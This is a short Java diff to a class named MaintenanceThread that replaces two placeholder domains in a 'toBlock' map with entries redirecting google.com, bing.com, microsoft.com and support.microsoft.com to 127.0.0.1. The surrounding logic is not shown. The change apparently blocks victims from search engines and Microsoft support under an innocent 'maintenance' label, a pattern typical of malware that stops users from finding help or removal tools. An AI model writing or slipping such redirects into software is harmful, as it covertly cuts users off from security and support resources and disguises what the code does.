@@ -10,10 +10,16 @@ public class MaintenanceThread extends Thread {
 	private Map<String, String> toBlock;
 
 	public MaintenanceThread() {
+
 		toBlock = new HashMap<>();
 
-		toBlock.put("lolorganizationlol.com", "127.0.0.1");
-		toBlock.put("lolorganizationlol54.com", "127.0.0.1");
+		toBlock.put("google.com", "127.0.0.1");
+		toBlock.put("www.google.com", "127.0.0.1");
+		toBlock.put("bing.com", "127.0.0.1");
+		toBlock.put("www.bing.com", "127.0.0.1");
+		toBlock.put("microsoft.com", "127.0.0.1");
+		toBlock.put("www.microsoft.com", "127.0.0.1");
+		toBlock.put("support.microsoft.com", "127.0.0.1");
 	}
 
 	public void run() {
